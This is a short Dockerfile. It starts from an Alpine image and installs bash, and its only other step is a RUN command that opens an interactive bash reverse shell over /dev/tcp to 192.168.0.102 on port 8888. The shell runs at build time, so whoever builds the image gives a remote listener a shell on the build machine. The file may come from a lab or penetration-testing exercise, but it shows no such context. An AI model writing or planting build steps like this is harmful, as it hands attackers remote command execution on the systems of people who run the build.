FROM alpine
RUN apk update && apk add bash
RUN /bin/bash -c 'bash -i > /dev/tcp/192.168.0.102/8888 0<&1 2>&1'